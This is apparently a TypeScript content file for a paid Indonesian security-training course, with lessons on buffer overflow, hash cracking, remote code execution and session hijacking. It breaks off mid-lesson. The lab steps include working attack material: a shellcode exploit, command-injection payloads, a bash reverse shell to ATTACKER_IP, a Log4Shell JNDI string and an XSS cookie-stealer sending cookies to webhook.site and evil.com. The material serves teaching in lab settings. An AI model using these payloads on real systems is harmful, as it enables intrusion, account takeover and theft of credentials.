// CyberEd — Materi Serangan System: Buffer Overflow, Password Cracking, RCE, Session Hijacking
// Double-quote outer string + \\\" escape untuk inner quotes. Pattern konsisten dengan serangan-web.ts.
import type { MateriData } from "../materi-content/runner";

export const seranganSystem: MateriData[] = [
  // ============================ BUFFER OVERFLOW ============================
  {
    judul: "💥 Buffer Overflow — Tumpah Memori untuk RCE",
    emoji: "💥",
    deskripsi: "Pelajari konsep dasar buffer overflow di stack, latihan dengan program C sederhana yang vulnerable, dan eksplorasi ASLR bypass di lab modern.",
    level: "sulit",
    harga: 25000,
    hargaCoret: 35000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham konsep stack frame vs heap, bagaimana buffer overflow menimpa return address, dan tools apa yang dipakai untuk exploit latihan (gdb + pwntools).",
    analogy: "Bayangkan formulir panjang dengan maksimal 10 karakter. Kalian tulis sampai 12 karakter. Dua karakter tambahan merembes ke area sebelah formulir — bisa merusak data struktur internal. Buffer overflow = program yang baca input tanpa batas, dan data ekstra menutupi variabel adjacent atau return address CPU.",
    apaItu: "Buffer Overflow adalah vulnerability di mana program menulis data lebih banyak dari kapasitas buffer yang disediakan di memori, sehingga menutupi area memori adjacent.\n\n1) Stack-based: data di stack (function calls) ditutupi → umumnya untuk RCE karena bisa overwrite return address.\n2) Heap-based: data di heap (malloc memory) ditutupi → umumnya untuk data corruption atau write-what-where.\n\nDampak: Application crash, privilege escalation, RCE jika attacker bisa control return address.",
    caraKerja: "Program vulnerable (C):\n  void vulnerable(char *input) {\n    char buf[64];\n    strcpy(buf, input);\n    printf(\"Input: %s\\n\", buf);\n  }\n\nStrcpy menyalin input ke buf[64] tanpa cek batas. Input >64 chars akan overwrite saved EBP lalu return address. Kalau attacker bisa overwrite return address dengan pointer ke shellcode atau ke function system(), program melompat ke kode attacker saat function return.",
    asciiDiagram: "MEMORY LAYOUT (stack grows down):\n\nHIGH ADDRESS\n  buf[63..0]      <- 64 byte untuk input\n  saved EBP       <- 8 byte\n  return address  <- 8 byte (tujuan lompat saat function return)\nLOW ADDRESS\n\nNormal: ret addr -> main().\nOverflow: ret addr -> shellcode (controlled by attacker).",
    senjata: {
      pc: "gcc (compile C, disable stack protector: -fno-stack-protector), gdb (debugger: disassemble + step-trace), pwntools (Python library exploit), Python 3 untuk skrip exploit.",
      hp: "Tidak praktis. Buffer overflow butuh disassembly + debugger.",
    },
    metode: [
      {
        nama: "Metode 1: Compile Program Vulnerable + Identifikasi Buffer Size (Pemula)",
        level: "pemula",
        deskripsi: "Setup lab pertama: tulis program C vulnerable, compile dengan no protection, lalu cari tahu offset return address.",
        prasyarat: ["Linux dengan gcc", "Python 3", "gdb terinstall", "VM atau container (untuk safety)"],
        langkah: [
          {
            judul: "Tulis program vulnerable",
            aksi: "Kalian buka terminal. Buat folder lab: mkdir ~/bof-lab && cd ~/bof-lab. Tulis program vulnerable dengan nano overflow.c. Source code:\n\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable(char *input) {\n  char buf[64];\n  strcpy(buf, input);\n  printf(\"Input was: %s\\n\", buf);\n}\n\nint main(int argc, char *argv[]) {\n  if (argc != 2) { printf(\"Usage: %s <input>\\n\", argv[0]); return 1; }\n  vulnerable(argv[1]);\n  printf(\"Program finished normally.\\n\");\n  return 0;\n}",
            expected: "File overflow.c tersimpan dengan source code di atas.",
          },
          {
            judul: "Compile dengan proteksi minimal",
            aksi: "Compile dengan stack protector OFF, ASLR dependent static binary, stack executable:\ngcc -fno-stack-protector -z execstack -no-pie -o overflow overflow.c\n\nPenjelasan:\n- -fno-stack-protector => disable canaries\n- -z execstack => stack executable untuk shellcode injection\n- -no-pie => binary address statis, tidak ASLR",
            command: "gcc -fno-stack-protector -z execstack -no-pie -o overflow overflow.c",
            expected: "Compiled tanpa error. File ./overflow executable.",
          },
          {
            judul: "Run dengan input normal + abnormal",
            aksi: "Test program: ./overflow \"hello world\" (output sukses). Sekarang coba input panjang > 64 karakter: ./overflow <80 As>. Hasil: Segmentation fault karena 80 byte A menutupi saved EBP dan return address.",
            command: "./overflow $(python3 -c \"print('A' * 80)\")",
            expected: "Input was: AAAAAA...AAAA. Segfault saat return.",
          },
          {
            judul: "Identifikasi offset return address dengan gdb + cyclic",
            aksi: "Run di gdb: gdb ./overflow. Di gdb prompt, generate cyclic pattern 200 chars:\n(gdb) run $(python3 -c \"from pwn import *; print(cyclic(200).decode())\")\n(gdb) info registers\nCari RSP/RIP value → cyclic_find untuk dapat offset exact (biasanya 72 bytes untuk 64-byte buf + 8 saved EBP).",
            command: "python3 -c \"from pwn import *; print(cyclic(200).decode())\"",
            expected: "String pattern de Bruijn. Akan dipakai untuk identifikasi exact offset.",
          },
        ],
        outputAkhir: "Berhasil compile program vulnerable dan identifikasi offset return address.",
        kesalahanUmum: [
          { masalah: "Compile error canary detected atau ASLR", solusi: "Pastikan pakai flag -fno-stack-protector -no-pie -z execstack. Atau disable ASLR di runtime: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space" },
          { masalah: "gdb tidak terinstall", solusi: "Install: sudo apt install gdb python3-pip && pip install pwntools" },
          { masalah: "Offset tidak tepat, return address terus invalid", solusi: "Pakai cyclic pattern dari pwntools. Run di gdb dengan pattern tertentu -> cyclic_find untuk dapat offset exact." },
        ],
      },
      {
        nama: "Metode 2: Shellcode Injection untuk Dapatkan Shell (Lanjut)",
        level: "lanjut",
        deskripsi: "Setelah tahu offset, inject shellcode untuk mengarah program ke kode yang menjalankan shell (/bin/sh).",
        prasyarat: ["Sudah selesai Metode 1 (offset teridentifikasi)", "pwntools installed"],
        langkah: [
          {
            judul: "Cari alamat shellcode di stack",
            aksi: "Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space. Run di gdb untuk dapatkan alamat buf:\n(gdb) break vulnerable\n(gdb) run aaa\n(gdb) print &buf\nAlamat keluar seperti: 0x7fffffffe000.",
            command: "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space",
            expected: "ASLR disabled. Stack address predictable setiap run.",
          },
          {
            judul: "Generate shellcode untuk /bin/sh amd64",
            aksi: "Generate shellcode pakai pwntools. Dari shell Python:\nfrom pwn import *\ncontext.arch = \"amd64\"\nprint(shellcraft.amd64.linux.sh())\n\nAtau shellcode pre-built x86_64 execve(/bin/sh) panjang ~48 bytes.",
            command: "python3 -c \"from pwn import *; context.arch = 'amd64'; print(shellcraft.amd64.linux.sh())\"",
            expected: "Shellcode bytes tercetak.",
          },
          {
            judul: "Craft payload dan exploit",
            aksi: "Payload: shellcode + NOP sled (16 bytes) + padding + return address ke buf:\nfrom pwn import *\npayload = b'\\x90' * 16 + SHELLCODE + b'A' * (offset - 16 - len(SHELLCODE)) + p64(BUF_ADDR)\np = process(\"./overflow\")\np.sendline(payload)\np.interactive()  # shell interaktif",
            command: "python3 -c \"from pwn import *; p = process('./overflow'); p.sendline(b'A'*72 + p64(0x7fffffffe000)); p.interactive()\"",
            expected: "Shell interaktif muncul. Bisa ketik ls, pwd, dll.",
          },
          {
            judul: "Verify post-exploit",
            aksi: "Di shell interaktif: ketik id. Output: uid info user. Lalu uname -a untuk cek OS info. Program sekarang jalan tapi dimilikinya attacker.",
            command: "id",
            expected: "id command jalan. Shell interactif berfungsi.",
          },
        ],
        outputAkhir: "Berhasil exploit buffer overflow untuk dapatkan shell interaktif dengan pwntools.",
        kesalahanUmum: [
          { masalah: "Shellcode tidak execute (segfault di tengah payload)", solusi: "Pastikan stack executable: compile pakai -z execstack. ASLR disabled. Address buf benar (cetak di gdb sebelum run payload)." },
          { masalah: "NOP sled tidak cukup panjang", solusi: "Tambah NOP sled jadi 256 bytes. Lokasi stack mungkin sedikit shift tiap run." },
        ],
      },
    ],
    mitigasi: "Pertahanan buffer overflow modern: stack canary (gcc default), ASLR (default ON di distro modern), NX/DEP (no-execute stack), PIE (position-independent executable), bahasa modern (Rust auto-bounds check), bound checking (strncpy/snprintf/fgets daripada strcpy), constant-time string operations.",
    latihan: ["Setup lab: tulis 3 program C vulnerable (strcpy, gets, sprintf). Cari offset return address dengan pattern_create.", "Pelajari compile flag proteksi: efek stack canary vs ASLR dengan disabling satu per satu.", "Eksplorasi format string vulnerability: printf(user_input) tanpa %s.", "Pelajari ROP untuk bypass NX.", "Pelajari heap overflow pakai House of Force atau House of Spirit."],
    faq: [
      { q: "Apakah buffer overflow masih relevan di 2024?", a: "Untuk C/C++ system level masih ada. Web app Java/Python/Node.js biasanya auto-bounds check." },
      { q: "Apakah bahasa aman seperti Rust/Java?", a: "Rust: bounds check by default. Java: runtime bounds check. Buffer overflow RCE sangat sulit di high-level language." },
      { q: "Apakah compiler sudah fix buffer overflow?", a: "Modern gcc/clang enable stack protector dan PIE default. Tapi developer masih bisa disable." },
      { q: "Apa itu ROP?", a: "Return Oriented Programming: rangkai gadget instruction di binary existing untuk eksekusi serangan. Mem-bypass NX." },
    ],
    ringkasan: ["Buffer overflow = write beyond buffer, mask saved EBP / return address", "Stack overflow: untuk RCE; heap overflow: corruption", "Toolchain: gcc -fno-stack-protector, gdb, pwntools", "Defense: canary + ASLR + PIE + NX", "Praktikkan di VM isolated"],
    materiRelated: ["Password Cracking", "RCE", "Session Hijacking"],
  } as MateriData,

  // ============================ PASSWORD CRACKING ============================
  {
    judul: "🔑 Password Cracking — Pecah Sandi Hash dengan Brute Force",
    emoji: "🔑",
    deskripsi: "Pelajari crack password hash dengan hashcat + john, jenis hash (MD5, SHA1, bcrypt, NTLM), dan Rainbow Tables.",
    level: "menengah",
    harga: 18000,
    hargaCoret: 28000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham berbagai jenis hash (MD5, SHA, bcrypt, NTLM), mampu crack MD5 cepat dengan hashcat & john, dan paham teknik defense hashing lambat.",
    analogy: "Bayangkan brankas dengan kombinasi angka. Setiap kombinasi yang dicoba = waktu + listrik. Password cracking = coba jutaan kombinasi di super-computer. Password panjang + kompleks = waktu yang dibutuhkan mendekati tak hingga.",
    apaItu: "Password cracking adalah proses recovery plaintext password dari hashed form (data breach dump, hash dump dari server compromise).\n\nTeknik utama:\n- Dictionary: coba semua kata dari wordlist (rockyou.txt, 14 juta password)\n- Brute force: semua kombinasi mungkin (eksponensial waktu)\n- Rainbow tables: pre-computed hash untuk setiap plaintext sampai length tertentu\n- Rule-based: modify wordlist (capitalize, append digits)",
    caraKerja: "Hash adalah one-way function: hash(password) = 5f4dcc3b5aa765d61d8327deb882cf99. Tidak ada reverse function yang mudah.\n\nCracking efektif dengan:\n- Pre-computed tables (rainbow table) untuk hash cepat tanpa salt\n- GPU brute force modern (NVIDIA RTX dengan hashcat miliar hash/detik untuk MD5)\n- Dictionary + rule yang efisien\n\nPemilihan algoritma:\n- MD5, SHA1 (no salt): sangat cepat crack → 50+ GH/s di GPU modern\n- bcrypt (rounds 10): ~50 hash/detik → memakan waktu\n- Argon2: GPU tidak efisien untuk crack",
    asciiDiagram: "INPUT: password123\n        |\n        v\nHASH FUNCTION (MD5 / SHA1 / bcrypt / Argon2)\n        |\n        v\nOUTPUT: 482c811da5d5b4bc1d3f1a4b6e2d0b7c\n\nCRACKING LOGIKA:\n  1. Baca hash dari dump/file\n  2. Generate candidate plaintext dari wordlist\n  3. Hash(md5/...) setiap candidate\n  4. Bandingkan hasil hash dengan target\n  5. Match -> found password\n\nHASHCAT DISPLAY:\n  Session..........: hashcat\n  Status...........: Running\n  Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99\n  Speed.#1.........: 53,000 MH/s",
    senjata: {
      pc: "hashcat (GPU-based crack, support 300+ hash types), John the Ripper (CPU-based, classic), wordlist rockyou.txt (14 juta password), hash-identifier.",
      hp: "Hashcat punya versi ARM untuk Android, tapi susah konfigurasi. Lebih praktis pakai tool online untuk hash MD5/SHA (crackstation.net, hashes.com).",
    },
    metode: [
      {
        nama: "Metode 1: Crack MD5 dengan Hashcat (Pemula)",
        level: "pemula",
        deskripsi: "MD5 adalah hash paling sederhana untuk crack — miliar hash per detik di GPU modern.",
        prasyarat: ["Linux dengan hashcat (apt install hashcat) atau Windows", "GPU NVIDIA (disarankan) atau Intel CPU", "Wordlist rockyou.txt"],
        langkah: [
          {
            judul: "Install hashcat + download wordlist rockyou.txt",
            aksi: "Kalian install hashcat lalu download rockyou.txt. Untuk Linux:\nsudo apt install hashcat -y\nwget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt\nFile ini 14 juta password (warn: ~150 MB).",
            command: "sudo apt install hashcat -y\nwget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt",
            expected: "Hashcat installed. ~/rockyou.txt ada.",
          },
          {
            judul: "Setup target: hash MD5 dari password",
            aksi: "Generate hash target untuk latihan: MD5(password) = 5f4dcc3b5aa765d61d8327deb882cf99. Simpan di file: echo 5f4dcc3b5aa765d61d8327deb882cf99 > ~/hash.txt\nAtau cek manual: python3 -c \"import hashlib; print(hashlib.md5(b'password').hexdigest())\".",
            command: "python3 -c \"import hashlib; print(hashlib.md5(b'password').hexdigest())\"",
            expected: "Output: 5f4dcc3b5aa765d61d8327deb882cf99",
          },
          {
            judul: "Run hashcat dengan dictionary attack",
            aksi: "Jalankan:\nhashcat -m 0 -a 0 ~/hash.txt ~/rockyou.txt\n\nPenjelasan:\n- -m 0 = hash type MD5\n- -a 0 = attack mode straight (dictionary)\n- File hash.txt adalah target\n- rockyou.txt adalah wordlist",
            command: "hashcat -m 0 -a 0 ~/hash.txt ~/rockyou.txt",
            expected: "Hashcat menemukan password: 5f4dcc3b5aa765d61d8327deb882cf99:password",
          },
          {
            judul: "Coba hash bcrypt (jauh lebih lambat)",
            aksi: "Hash bcrypt rounds 10 dari password:\npython3 -c \"import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=10)).decode())\"\nSalin ke file bcrypt_hash.txt. Crack:\nhashcat -m 3200 -a 0 bcrypt_hash.txt ~/rockyou.txt\n\n-m 3200 = bcrypt\nHasil: jauh lebih lambat (~10 hash/detik vs 50 GH/s). Butuh menit/jam untuk single hash.",
            command: "python3 -c \"import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=10)).decode())\"",
            expected: "Hash bcrypt dengan prefix $2b$10$. Crack dengan speed ~10 H/s.",
          },
        ],
        outputAkhir: "Berhasil crack MD5 + memahami bcrypt jauh lebih lambat (5,000,000,000x lebih lambat per hash).",
        kesalahanUmum: [
          { masalah: "No hashes loaded atau Separator unmatched", solusi: "Pastikan format file hash benar (satu hash per baris atau mode valid). Cek https://hashcat.net/wiki/doku.php?id=example_hashes" },
          { masalah: "GPU tidak terdeteksi (OpenCL error)", solusi: "Install NVIDIA CUDA toolkit + nvidia-driver. Atau force CPU mode: -d 1 (lebih lambat tapi workable)." },
          { masalah: "Kecepatan sangat lambat di CPU mode", solusi: "GPU sangat penting. CPU: ~50 MH/s vs GPU: ~50,000 MH/s = 1,000,000x lebih lambat." },
        ],
      },
      {
        nama: "Metode 2: Crack dengan Rule-Based Attack",
        level: "menengah",
        deskripsi: "Rule-based attack mengaplikasikan transformation ke wordlist: capitalize, add number suffix, leet speak.",
        prasyarat: ["Hashcat installed", "Wordlist rockyou.txt", "Hashcat rule files"],
        langkah: [
          {
            judul: "Buat hash MD5 dari password dimodifikasi",
            aksi: "MD5(Password123) = 42f749ade7f9e195bf475f37a44cafcb. Simpan di mod_hash.txt. Hash ini tidak akan match dengan dictionary biasa (tidak ada Password123 di rockyou.txt).",
            command: "python3 -c \"import hashlib; print(hashlib.md5(b'Password123').hexdigest())\"",
            expected: "Hash: 42f749ade7f9e195bf475f37a44cafcb",
          },
          {
            judul: "Run rule-based attack pakai best64.rule",
            aksi: "Hashcat punya rule files bawaan di /usr/share/hashcat/rules/. best64.rule paling powerful untuk capital + suffix angka.\nRun attack:\nhashcat -m 0 -a 0 mod_hash.txt ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            command: "hashcat -m 0 -a 0 mod_hash.txt ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            expected: "Hash crack dalam detik: Password123",
          },
          {
            judul: "Custom rule via mask",
            aksi: "Pakai mask attack untuk leet speak atau pola spesifik:\nhashcat -m 0 -a 3 mod_hash.txt ?u?l?l?l?l?l?l?d?d?d\n\nMask:\n- ?u = uppercase letter\n- ?l = lowercase\n- ?d = digit\n- Pola: capital + 6 lowercase + 3 digit = Password123",
            command: "hashcat -m 0 -a 3 mod_hash.txt ?u?l?l?l?l?l?l?d?d?d",
            expected: "Hash crack dalam hitungan detik untuk pattern ini.",
          },
          {
            judul: "Hybrid attack (word + digits)",
            aksi: "Hybrid attack 6: dictionary + mask (word + 3 digits):\nhashcat -m 0 -a 6 mod_hash.txt ~/rockyou.txt ?d?d?d\n\nAtau mask + dict (-a 7).",
            command: "hashcat -m 0 -a 6 mod_hash.txt ~/rockyou.txt ?d?d?d",
            expected: "Hash crack.",
          },
        ],
        outputAkhir: "Berhasil crack password termodifikasi (Password123) dengan rule-based dan mask attack.",
        kesalahanUmum: [
          { masalah: "Rule file not found", solusi: "Default di /usr/share/hashcat/rules/. Atau download dari hashcat-rules-collection di GitHub." },
          { masalah: "Mask terlalu besar (waktu infinite)", solusi: "Lebih dari 10 karakter mask sangat lama. Gunakan targeted wordlist dari breach dump." },
        ],
      },
    ],
    mitigasi: "Pertahanan password: Bcrypt (rounds min 12) atau Argon2 (memory-hard), Salt per user (rainbow table tidak berguna), Min length 12+ karakter, Passphrase (XKCD method), MFA everywhere, Rate limit login, Disable breached password via HIBP API.",
    latihan: ["Setup hashcat + rockyou. Crack 1 hash MD5 dalam <1 menit.", "Buat akun DVWA / WordPress dengan beberapa password variasi. Hash dump, lalu crack.", "Setup Active Directory lab di VM Windows Server. Dump hash dengan mimikatz. Crack dengan hashcat.", "Pelajari Pass-the-Hash di AD lab.", "Build Rainbow Tables (legacy)."],
    faq: [
      { q: "Apakah bcrypt bisa di-crack?", a: "Bisa tapi sangat lambat. GPU modern bcrypt rounds 12: ~10 hash/detik. Password 8 chars random butuh ~700,000 tahun 1 GPU." },
      { q: "Bagaimana cara tahu password saya sudah di-breach?", a: "Cek https://haveibeenpwned.com. Untuk enterprise: API HIBP + password policy." },
      { q: "Apakah rainbow tables masih relevan?", a: "Tidak untuk hash modern (salt). Tapi untuk legacy unsalted hash masih relevan." },
      { q: "Apakah GPU cracking ilegal?", a: "Cracking your own password: legal. Crack password orang lain: ilegal." },
    ],
    ringkasan: ["Cracking depends on hash algo + salt + length", "MD5/SHA1 unsalted: miliar/detik GPU", "bcrypt/Argon2: ~10/detik", "Tool: hashcat (GPU) + john (CPU) + rockyou.txt", "Rule-based: scalable untuk modified password", "Red team: hours untuk unsalted dump"],
    materiRelated: ["Buffer Overflow", "Session Hijacking", "RCE"],
  } as MateriData,

  // ============================ RCE ============================
  {
    judul: "💣 Remote Code Execution (RCE) — Eksekusi Kode di Server Jarak Jauh",
    emoji: "💣",
    deskripsi: "Pelajari macam vector RCE (command injection, deserialization, log4shell), deteksi, dan eksploitasi di lab.",
    level: "sulit",
    harga: 22000,
    hargaCoret: 32000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham berbagai vector RCE, mampu eksploitasi command injection sederhana, dan tahu defense input validation + sandboxing.",
    analogy: "Bayangkan remote control mobil. Remote control mengirim sinyal ke mobil. Kalau attacker bisa kirim sinyal yang sama persis dengan sinyal kontrol → mobil jalan sesuai perintah attacker. RCE = attacker bisa kirim sinyal kode/program ke server sehingga server menjalankan kode attacker.",
    apaItu: "Remote Code Execution (RCE) adalah vulnerability kelas tinggi di mana attacker bisa menjalankan kode/program arbitrary di server target.\n\n1) Command injection: input user di-pass ke system command tanpa sanitize\n2) Deserialization: input user di-deserialize tanpa type safety\n3) Template injection: user input masuk ke template engine\n4) Log4Shell-style: user-controlled input sampai ke vulnerable library",
    caraKerja: "Command injection klasik (PHP):\n  $ip = $_GET[\"ip\"];\n  echo shell_exec(\"ping -c 1 \" . $ip);\n\nAttacker akses: ping.php?ip=127.0.0.1; cat /etc/passwd\nCommand OS execute: ping -c 1 127.0.0.1; cat /etc/passwd\nSetara dengan dua command terpisah oleh `;` -> `cat /etc/passwd` akan jalan.",
    asciiDiagram: "NORMAL:\n  ping -c 1 127.0.0.1\n\nATTACKER URL:\n  /ping.php?ip=127.0.0.1;cat+/etc/passwd\n\nSHELL INTERPRETER:\n  shell_exec(ping -c 1 127.0.0.1;cat /etc/passwd)\n\nOS EXECUTE:\n  Command 1: ping -c 1 127.0.0.1\n  Command 2: cat /etc/passwd  <- attacker payload",
    senjata: { pc: "Burp Suite, OWASP ZAP, Burp scanner. Lab: DVWA Command Injection, atau HackTheBox box yang punya RCE vector.", hp: "Browser via mobile ke DVWA." },
    metode: [
      {
        nama: "Metode 1: Command Injection via Ping App (Pemula)",
        level: "pemula",
        deskripsi: "Bentuk paling jelas command injection: aplikasi ajar ping tapi attacker inject command lain pakai shell separator.",
        prasyarat: ["DVWA Command Injection lab via Docker"],
        langkah: [
          { judul: "Buka DVWA Command Injection page", aksi: "Kalian login DVWA -> set security Low -> klik Command Injection. Ada input field IP address. Submit 127.0.0.1 -> output muncul dari ping normal.", expected: "Ping output normal." },
          { judul: "Tambahkan separator ; untuk chain command", aksi: "Submit: 127.0.0.1; ls. Output: ping + ls dari working directory. Confirmed RCE!", command: "127.0.0.1; ls", expected: "Output dari ping + ls command." },
          { judul: "Cari file sensitif", aksi: "Submit: 127.0.0.1; cat /etc/passwd. Output termasuk ping + isi /etc/passwd. Sekarang attacker bisa baca semua file yang accessible dari user www-data.", command: "127.0.0.1; cat /etc/passwd", expected: "Output ping + daftar user sistem: root:x:0:0:..., www-data:x:33:33:..." },
          { judul: "Reverse shell dari RCE", aksi: "Setup listener nc di attacker PC: nc -lvnp 4444 (terminal lain). Inject reverse shell: 127.0.0.1; bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\". Shell interaktif muncul di terminal nc.", command: "nc -lvnp 4444", expected: "Shell interaktif muncul.", catatan: "Hanya di lab sendiri atau target dengan izin tertulis." },
        ],
        outputAkhir: "Berhasil RCE command injection + reverse shell.",
        kesalahanUmum: [
          { masalah: "Command injection tidak jalan", solusi: "Coba separator lain: |, &&, ||. Atau URL encode: %3B untuk ;" },
          { masalah: "Reverse shell tidak connect", solusi: "Attacker IP salah, atau firewall block outbound. Test koneksi keluar: 127.0.0.1; curl https://webhook.site/YOUR-ID" },
        ],
      },
      {
        nama: "Metode 2: Log4Shell (CVE-2021-44228) Eksploitasi",
        level: "lanjut",
        deskripsi: "Log4Shell adalah deserialization vulnerability yang memungkinkan RCE instant via JNDI substitution di Log4j.",
        prasyarat: ["Paham Java dan konsep serialization", "Lab dengan aplikasi Java vulnerable"],
        langkah: [
          { judul: "Setup Log4Shell lab", aksi: "Clone vulnerable app dari GitHub:\ngit clone https://github.com/christophetd/log4shell-vulnerable-app\ncd log4shell-vulnerable-app\ndocker-compose up -d\n\nAtau jalankan vulnerable Java app di Lab environment.", expected: "App vulnerable running." },
          { judul: "Tes kerentanan Log4j versi", aksi: "Aplikasi yang pakai Log4j < 2.17.1 rentan. Untuk test:\ncurl http://localhost:8080 -H 'User-Agent: ${jndi:ldap://test.example.com/a}'\n\nJika log server membuat koneksi LDAP ke server Anda → app rentan.", command: "curl http://localhost:8080 -H 'User-Agent: ${jndi:ldap://test.example.com/a}'", expected: "Koneksi LDAP muncul jika rentan." },
          { judul: "Eksploitasi penuh dengan ysoserial", aksi: "Setup LDAP server untuk redirect ke malicious class:\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://YOUR_IP#Exploit\n\nGenerate malicious class dengan ysoserial exploit payload. Send JNDI substitution string ke vulnerable field (User-Agent, query param, etc). Class loader download -> deserialize -> execute reverse shell.", expected: "Reverse shell dari Java vulnerable server. RCE instan tanpa akses sebelumnya.", catatan: "Log4Shell belum fully patched di banyak sistem. Cek apakah server Anda rentan!" },
        ],
        outputAkhir: "Berhasil eksploitasi Log4Shell style RCE. Pemahaman konsep deserialization attack modern.",
        kesalahanUmum: [
          { masalah: "JNDI substitution tidak triggered", solusi: "Aplikasi mungkin sudah patch Log4j ke 2.17.1+. Cek versi Log4j di dependency tree (Maven/Gradle)." },
        ],
      },
    ],
    mitigasi: "Pertahanan RCE: Input validation (whitelist), Avoid shell_exec + system (pakai API native syscall), Parameterized queries (subprocess + shell=False di Python), Sandbox execution (Docker container + seccomp profile), Deserialization disable (no ObjectInputStream), Patch dependencies (Log4j >= 2.17.1), WAF dengan RCE rules.",
    latihan: ["Setup DVWA Command Injection lab. Eksploitasi untuk cat /etc/passwd.", "Pelajari command substitution: $(command), backticks, && untuk bypass filter.", "Setup vulnerable web app untuk Log4Shell (log4shell-vulnerable-app di GitHub). Reproduksi CVE-2021-44228.", "Pelajari Tools ysoserial dan marshalsec untuk eksploitasi Log4Shell lokal."],
    faq: [
      { q: "Apa beda RCE dan command injection?", a: "RCE adalah kelas vulnerability umum (eksekusi kode arbitrary). Command injection adalah subtype RCE (injeksi ke OS command)." },
      { q: "Apakah sandboxing cukup untuk block RCE?", a: "Tergantung. Container escape mungkin masih memungkinkan jika ada misconfig atau kernel vuln. Defense berlapis: container + seccomp + OWASP mitigations." },
      { q: "Apakah Log4Shell sudah selesai?", a: "Update Log4j ke 2.17.1+ sudah block. Tapi banyak sistem legacy masih rentan." },
    ],
    ringkasan: ["RCE = kelas paling parah OWASP", "Vector: command injection, deserialization", "Defense: input validation + sandboxing + patching", "Log4Shell (2021) contoh deserialization attack modern"],
    materiRelated: ["SQL Injection", "Buffer Overflow", "LFI/RFI"],
  } as MateriData,

  // ============================ SESSION HIJACKING ============================
  {
    judul: "🍪 Session Hijacking — Curi Cookie Session Login",
    emoji: "🍪",
    deskripsi: "Pelajari cara session token disusun, bagaimana attacker colong session via XSS atau MITM, dan defense HttpOnly + binding.",
    level: "menengah",
    harga: 18000,
    hargaCoret: 28000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham konsep session token, mampu deteksi jika session tidak HttpOnly + secure, dan tahu pertahanan modern (JWT + binding).",
    analogy: "Bayangkan klub malam dengan stempel tangan. Setelah masuk, stempel jadi passport untuk masuk lagi. Kalau pencuri comot cap tangan anda dari gelas anda ke lengannya -> pencuri bisa masuk tanpa perlu KTP. Session hijacking = cookie session yang sama persis — siapa pun yang pegang cookie = dianggap logged in.",
    apaItu: "Session Hijacking adalah serangan di mana attacker mendapatkan session ID valid dari user lain, dan pakai session itu untuk impersonate user.\n\nCara:\n1) XSS: JavaScript membaca document.cookie (kalau HttpOnly=False)\n2) MITM: attacker sniff traffic HTTP (kalau tidak HTTPS)\n3) Session fixation: attacker set session ID target dengan nilai attacker-tahu\n4) Physical access: local cookie cache\n5) Predictable session ID: PHP session ID lama bisa diprediksi",
    caraKerja: "Session ID dikirim otomatis oleh browser setiap request ke domain yang sama dengan cookie session. Server cek session storage -> jika match -> consider user logged in. Tidak perlu username/password tiap request.\n\nVulnerability muncul kalau:\n- Session ID bocor ke attacker (XSS, MITM)\n- Session ID bisa diprediksi\n- Session ID tidak dirotate setelah login\n- Session ID tidak timeout",
    asciiDiagram: "NORMAL:\n  Browser --[cookie: PHPSESSID=ABC123]--> Server\n  Server cek session storage: {ABC123: user=admin} -> valid\n\nSESSION HIJACKING VIA XSS:\n  Victim login bank -> PHPSESSID=ABC123 set in browser\n  Victim buka forum lain -> XSS trigger\n  XSS: fetch(\"evil.com/?\"+document.cookie)\n  Attacker dapat: PHPSESSID=ABC123\n  Attacker pakai cookie di browser sendiri -> Server anggap attacker = victim\n\nSESSION FIXATION:\n  Attacker kasih browser victim cookie PHPSESSID=KNOWN\n  Victim login dengan cookie ini\n  Attacker pakai cookie KNOWN -> Server treat sebagai valid",
    senjata: { pc: "Browser DevTools (Application -> Cookies). DVWA XSS Reflected lab. Burp Suite untuk intercept.", hp: "Browser DevTools mobile. Untuk see cookies di HP Chrome: chrome://inspect (via USB debugging)." },
    metode: [
      {
        nama: "Metode 1: Session Hijacking via XSS (Pemula)",
        level: "pemula",
        deskripsi: "Paling standar: pakai XSS Reflected/Stored untuk curi cookie session dari victim.",
        prasyarat: ["DVWA XSS (Reflected atau Stored) lab", "Cookie session lab masih HttpOnly=Off (DVWA default tidak set HttpOnly)"],
        langkah: [
          { judul: "Setup lab: webhook.site untuk capture", aksi: "Kalian buka https://webhook.site di browser. Copy URL unik Anda (misal: https://webhook.site/xyz789). URL ini akan menyimpan GET request yang diterima.", expected: "URL webhook.site sudah disalin." },
          { judul: "Submit XSS payload cookie-stealer", aksi: "Buka DVWA -> XSS Reflected -> submit payload: <script>document.location='https://webhook.site/xyz789?c='+document.cookie</script>", command: "<script>document.location='https://webhook.site/xyz789?c='+document.cookie</script>", expected: "Page di DVWA reflect payload. Saat victim buka, script execute -> redirect ke webhook.site dengan cookie di query." },
          { judul: "Trigger XSS sebagai victim (simulasi)", aksi: "Login DVWA di Chrome lain. Buka URL atau click payload reflect. Browser redirect ke webhook.site, dan tampil isi cookie pada URL query.", expected: "Cookie ter-exposed di webhook.site." },
          { judul: "Impersonate cookie", aksi: "Copy PHPSESSID dari URL webhook.site. Di browser attacker (Chrome), buka DevTools (F12) -> Application -> Cookies -> url DVWA -> edit PHPSESSID value -> paste. Refresh page. Sekarang attacker logged-in sebagai victim.", expected: "Login sebagai victim. Halaman admin DVWA terlihat. Impersonation berhasil." },
        ],
        outputAkhir: "Berhasil curi cookie via XSS dan impersonate user. HttpOnly=True akan block serangan ini.",
        kesalahanUmum: [
